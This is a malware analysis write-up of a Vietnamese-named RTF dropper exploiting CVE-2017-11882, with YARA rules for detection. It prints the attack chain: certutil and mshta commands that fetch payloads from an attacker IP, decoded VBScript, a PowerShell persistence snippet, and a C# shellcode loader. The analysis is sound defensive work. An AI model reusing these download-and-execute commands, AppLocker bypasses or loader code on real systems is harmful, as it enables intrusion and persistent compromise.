---

### Introduction

A RTF document ["Danh sach can bo.doc"](https://app.any.run/tasks/37502080-7c6e-43cd-b934-bfae72f25d21)(`A50386914339E119E27B37C81CF58972`) recently showed up on my radar. While analyzing, I noticed that it showcased a lot of the modern Applocker bypass techniques.  I thought this would be a good candidate for documentation so that other incident responders (and red teams) can learn from example.

### Execution Trace and EDR Bypass

Running the RTF in a sandbox and logging process command lines will highlight the user of commonly known AppLocker bypass techniques.

```
"C:\Program Files\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\admin\AppData\Local\Temp\malware.rtf"
 |-> "C:\Program Files\Common Files\Microsoft Shared\EQUATION\EQNEDT32.EXE" -Embedding
    |-> "mshta.exe http://45.77.209.52/temp02.hta
      |-> "C:\Windows\System32\cmd.exe" /c certutil.exe -urlcache -split -f "http://45.77.209.52/temp.doc" C:\Users\admin\AppData\Local\Temp\"temp.doc"
        |-> certutil.exe -urlcache -split -f "http://45.77.209.52/temp.doc" C:\Users\admin\AppData\Local\Temp\"temp.doc"
      |-> "C:\Windows\System32\cmd.exe" /c certutil.exe -urlcache -split -f "http://45.77.209.52/temp.doc" delete
        |-> certutil.exe -urlcache -split -f "http://45.77.209.52/temp.doc" delete
      |-> "C:\Windows\System32\cmd.exe" /c start C:\Users\admin\AppData\Local\Temp\"temp.doc"
        |-> "C:\Program Files\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\admin\AppData\Local\Temp\temp.doc"
      |-> "C:\Windows\System32\cmd.exe" /c certutil.exe -urlcache -split -f "http://45.77.209.52/planetearth.ps1" C:\Users\admin\AppData\Local\Temp\win.ps1
        |-> certutil.exe -urlcache -split -f "http://45.77.209.52/planetearth.ps1" C:\Users\admin\AppData\Local\Temp\win.ps1
      |-> "C:\Windows\System32\cmd.exe" /c certutil.exe -urlcache -split -f "http://45.77.209.52/planetearth.ps1" delete
        |-> certutil.exe -urlcache -split -f "http://45.77.209.52/planetearth.ps1" delete
      |-> "C:\Windows\System32\cmd.exe" /c powershell.exe -exec bypass -file C:\Users\admin\AppData\Local\Temp\win.ps1
        |-> "C:\Windows\System32\mshta.exe" vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\admin\AppData\Local\Temp\HmUMV.dat""),0"))
          |-> "C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe" /logfile= /LogToConsole=false /U C:\Users\admin\AppData\Local\Temp\HmUMV.dat
      |-> "C:\Windows\System32\cmd.exe" /c del C:\Users\admin\AppData\Local\Temp\win.ps1
```


Throughout this chain of execution there isn't a single instance of directly running an executable.  The closest example of running the downloader directly is through proxying via the InstallUtil executable. 

### Technical Analysis
The document exploits CVE 2017-11882.  The main section of interest that loads up the exploit is below.


When the exploit is successful the following command runs which downloads a HTA file containing VBE code file from `45.77.209.52`

```
mshta.exe http://45.77.209.52/temp02.hta
```

The contents of the HTA file.

```
 <script language="VBScript.Encode">#@~^YwMAAA==@#@r	NKhR"+UrKGPZ~~T@#@bUNKhRsG-+:W,Of!TTBOf!ZT@#@&?nO,\l.mkPxP;lr(L+1Yv^tM`0G*[^4M`F8X#LmtMc1,*[1t.`qqW#'m4.`8!XbLmt.c8F+#L^4Dc8F+#[1tMcc+#'m4Dc02#[14DvF!Wb'm4DvFTFb'1t.`8T%*[^4M`FT0*#@#@&7CM\{dcD!xPrms[6nPJm~DY!Ok^R+Xn~O!D^mCm4n,Odw^rY,OW~rJtOOa)&zWXcG\{c Z,Rl JO+sw NKmEE,]hwu-JrOn:aR9W^JEEBPT~,PI`2@#@&7lDmdcD;x,E1:[c+X+PJm,^+MY;YbV nX+P ;D^ml14nP /aVrY~R6PEJ4OYa)&&W*R\{\{c T,cXyz:aRNKmrEP9+s+D+ES,!~,PI`2@#@&-CD|/cD;x~E1:[a+,z^~kYl.O,]O+s2u-Er:wcNK^JrJSPZ@#@&-mD\{k D!xPr^hNc+X+~z^~1+.Y!Ok^RnPO;.^mCm4n,OdaVbYP 0,EJ4YOw=z&*lRGF  Z,Rl+&w^l	+O+C.Dt wkqJrPY:wYwSkURad8JS,!BPK"jA@#@&7l.\{kR.;	PJ1hNc+~&m,DOEOr^Rn~O!Ds^mmtn~ /2VbO,OW,JrtYDw=&zW* GFR+TOR*y&w^lOnlMY4R2/qErP[+^nJS~Z~PP]`2@#@&7CM\{dcD!xPrms[6nPJm~2Kh+MdVVcna+,6nm~8HwC/k~O6ksn,]Ynha]whbUcwd8JBP!BP:]jA@#@&\mDmdcDE	~J1:Ncna+,z1P[+s~uYn:aY-SkU a/FES,!@#@&kn^0 1VK/+@#@&6P4AAA==^#~@</script>
```

With the help of a simple de-obfuscation script, the following VBScript is decoded from the HTA.  The malware authors use certutil to download a powershell script (renamed to win.ps1) and a decoy document.  The powershell script is then executed with the ExecutionPolicy Bypass flags.  

```
Window.ReSizeTo 0, 0
Window.moveTo -3000,-3000
Set var_s = CreateObject(chr(87)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(46)&chr(83)&chr(104)&chr(101)&chr(108)&chr(108))
var_s.run "cmd.exe /c certutil.exe -urlcache -split -f ""http://45.77.209.52/temp.doc"" %temp%\""temp.doc""", 0, TRUE
var_s.run "cmd.exe /c certutil.exe -urlcache -split -f ""http://45.77.209.52/temp.doc"" delete", 0, TRUE
var_s.run "cmd.exe /c start %temp%\""temp.doc""", 0
var_s.run "cmd.exe /c certutil.exe -urlcache -split -f ""http://45.77.209.52/planetearth.ps1" %temp%\win.ps1", 0, TRUE
var_s.run "cmd.exe /c certutil.exe -urlcache -split -f ""http://45.77.209.52/planetearth.ps1"" delete", 0, TRUE
var_s.run "cmd.exe /c powershell.exe -exec bypass -file %temp%\win.ps1", 0, TRUE
var_s.run "cmd.exe /c del %temp%\win.ps1", 0
self.close
```

The contents of the encoded powershell script use a simple split operation followed by a call to `iex`



Deobfuscating the script will reveal a powershell script which 
* Writes an exe to `$env:TEMP+"\HmUMV.dat"`
* Sets up and write hihGDG.lnk in the Startup folder with instructions on how to launch the exe

The full contents of the script are

```
$InstallUtilv2 = $env:WINDIR+"\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe";
$InstallUtilv4 = $env:WINDIR+"\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe";

if (Test-Path $InstallUtilv2)
\{
	$Loader = $InstallUtilv2;
\}else
\{
	$Loader = $InstallUtilv4;
\}


$RRDmITbs = $env:TEMP+"\HmUMV.dat";
$aGUIb=
@"
vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""$Loader /logfile= /LogToConsole=false /U $RRDmITbs""),0"))
"@
```

As part of the Powershell script, a persistence method of a lnk file will execute the following command

```
mshta.exe 	vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\admin\AppData\Local\Temp\HmUMV.dat""),0"))
```

Extracting the base64 blob and decoding will rebuild an exe which is written in .NET.  The binary is executed using the same command as in the .lnk file which is using mshta -> vbscript -> InstallUtil.

Due to the executable being invoked with InstallUtil the class with the `[RunInstaller(true)]` decorator will execute the primary function of this malware.

When inspecting the main function, it simply prints a string to STDOUT and exits.  This is a clever method of evading a simple sandbox run or emulation.

```
using System;

// Token: 0x02000002 RID: 2
public class Program
\{
	// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
	public static void Main()
	\{
		Console.WriteLine("sTlSYMUzPFqOxhKx");
	\}
\}
```

The primary functionality of this backdoor is executed from the Sample class, calling the `.Exec()` method.

```
using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.Runtime.InteropServices;

// Token: 0x02000003 RID: 3
[RunInstaller(true)]
public class Sample : Installer
\{
	// Token: 0x06000003 RID: 3 RVA: 0x00002068 File Offset: 0x00000268
	public override void Uninstall(IDictionary savedState)
	\{
		while (true)
		\{
			Sample.Exec();
		\}
	\}

```

Diving into the `Exec()` method, it performs 3 functions. Builds a byte array of shellcode, VirtualAlloc's a section, copies the shellcode and spawn a thread to the newly copied code. 

```
	// Token: 0x06000004 RID: 4 RVA: 0x00002DD0 File Offset: 0x00000FD0
	public static void Exec()
	\{
		byte[] array = new byte[]
		\{
			245,
			232,
			214,
			12,
			0,
			0,
			221,
			10,
			60,
			...snipped...

		IntPtr hModule = Sample.LoadLibrary("kernel32.dll");
		IntPtr procAddress = Sample.GetProcAddress(hModule, "VirtualAlloc");
		Sample.TWZegjk tWZegjk = 	(Sample.TWZegjk)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Sample.TWZegjk));
		procAddress = Sample.GetProcAddress(hModule, "CreateThread");
		Sample.TCreateThread tCreateThread = (Sample.TCreateThread)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Sample.TCreateThread));
		uint num = tWZegjk(0u, (uint)array.Length, Sample.MEM_COMMIT, Sample.PAGE_EXECUTE_READWRITE);
		Marshal.Copy(array, 0, (IntPtr)((long)((ulong)num)), array.Length);
		IntPtr hHandle = IntPtr.Zero;
		uint num2 = 0u;
		IntPtr zero = IntPtr.Zero;
		hHandle = tCreateThread(0u, 0u, num, zero, 0u, ref num2);
		Sample.WaitForSingleObject(hHandle, 4294967295u);
```

Since the byte array is composed of raw code the next logical step is to load up the shellcode in a disassembler.

A small decoding function (in this case xor 0x35) to is used decode the second stage.

```
|       .-> 0x00000d1f      803235         xor byte [rdx], 0x35
|       :   0x00000d22      83c201         add edx, 1
|       :   0x00000d25      83e901         sub ecx, 1
|       :   0x00000d28      83f900         cmp ecx, 0
|       `=< 0x00000d2b      75f2           jne 0xd1f
```

Once decoding is completed, referencing strings on the output can give a good idea of what the shellcode does (junk strings are omitted).

```
wininet
user32
msvcrt
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
text/plain; charset=utf-8
kernel32.dll
%appdata%\FlashPlayer
\plug1.dat
www.yahoorealtors.com
45.77.209.52
tors.com
```

The shellcode is using a CRC32 API hashing routine, the following constants get resolved in the main function.

|API Hash|Function Name|
|----|----|
|0x3fc1bd8d|LoadLibraryA|
|0x9ce0d4a|VirtualAlloc|
|0xd6874364|lstrcmpi|

LoadLibraryA is then called on winnet and more functions are resolved.

|API Hash|Function Name|
|----|----|
|0xda16a83d|InternetOpenA|
|0xc24fa5f4|InternetConnectA|
|0x447d086b|HttpOpenRequestA|
|0xff00b1f6|HttpSendRequestA|
|0x6cc098f5|InternetReadFile|
|0xe5191d24|InternetCloseHandle|
|0x2b53da6|HttpQueryInfoA|

LoadLibraryA is then called on user32 and more functions are resolved.

|API Hash|Function Name|
|----|----|
|0xeb8798ca|InternetErrorDlg|

LoadLibraryA is called on msvcrt and more functions are resolved.

|API Hash|Function Name|
|----|----|
|0x272D2162|atoi|

InternetOpenA is called passing the UserAgent. Once the connection is established, InternetReadFile is called to invoke downloading of the second stage backdoor.

```
73573C9E | 50                       | push eax                                | eax:"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)"
73573C9F | FF D7                    | call edi                                | edi:InternetOpenA
```

### Network Notes

During execution the ET suricata signature `ET TROJAN [PTsecurity] Possible Cobalt Strike payload` was triggered.

### Developing Signatures
Malware authors will use and abuse many different file formats in order to ship code to an endpoint.  Sometimes it's a simple .js file in a zip sent in via phish, and other times it's buried deep within some powershell code and may never touch disk.
 
In this case, the malware does eventually touch disk, but the dropper is only the .NET file, which will load up the shellcode and exec everytime it's run.  Depending on the EDR tool(s) used within your network this attack can be caught in a variety of ways.  

The following yara rules will catch the binary at different stages of execution.

```
import "pe"

rule NET_Stager {
  meta:
    author = "Nick Hoffman"
    hash = "E47BBDF4ED7625D2316C4D6E7EA1495E"
    description = "Downloader dropped from A50386914339E119E27B37C81CF58972, simple rule looking for the metadata"
  condition:
    pe.version_info["InternalName"] == "stager.exe" and
    pe.version_info["FileVersion"] == "0.0.0.0"
}

rule NET_Stager_Shellcode {
  meta:
    author = "Nick Hoffman"
    hash = "E47BBDF4ED7625D2316C4D6E7EA1495E"
    description = "Patterns within the shellcode of the dropper dropped from A50386914339E119E27B37C81CF58972"
  strings:
    /*
    |       .-> 0x00000d1f      803235         xor byte [rdx], 0x35
    |       :   0x00000d22      83c201         add edx, 1
    |       :   0x00000d25      83e901         sub ecx, 1
    |       :   0x00000d28      83f900         cmp ecx, 0
    |       `=< 0x00000d2b      75f2           jne 0xd1f
    */
    $initial_decode = {80323583c20183e90183f9007?}
    /*
    7383459D | 55                       | push ebp                                |
    7383459E | 8B EC                    | mov ebp,esp                             |
    738345A0 | 51                       | push ecx                                |
    738345A1 | 29 C0                    | sub eax,eax                             |
    738345A3 | 64 8B 40 30              | mov eax,dword ptr fs:[eax+30]           |
    738345A7 | 8B 40 0C                 | mov eax,dword ptr ds:[eax+C]            |
    738345AA | 8B 50 1C                 | mov edx,dword ptr ds:[eax+1C]           |
    738345AD | 8B 42 08                 | mov eax,dword ptr ds:[edx+8]            |
    738345B0 | 8B 4A 20                 | mov ecx,dword ptr ds:[edx+20]           |
    738345B3 | 8B 12                    | mov edx,dword ptr ds:[edx]              |
    738345B5 | 66 83 79 0C 33           | cmp word ptr ds:[ecx+C],33              | 33:'3'
    738345BA | 75 F1                    | jne capstone.738345AD                   |
    738345BC | 89 45 FC                 | mov dword ptr ss:[ebp-4],eax            |
    738345BF | 8B 45 FC                 | mov eax,dword ptr ss:[ebp-4]            |
    738345C2 | 59                       | pop ecx                                 |
    738345C3 | 5D                       | pop ebp                                 |
    738345C4 | C3                       | ret                                     |
    */
    $peb_crawl_and_ret = {55 8B EC 51 29 C0 64 8B 40 30 8B 40 0C 8B 50 1C 8B 42 08 8B 4A 20 8B 12 66 83 79 0C 33 7? ?? 89 45 FC 8B 45 FC 59 5D C3}
    
  condition:
    any of them
}
```
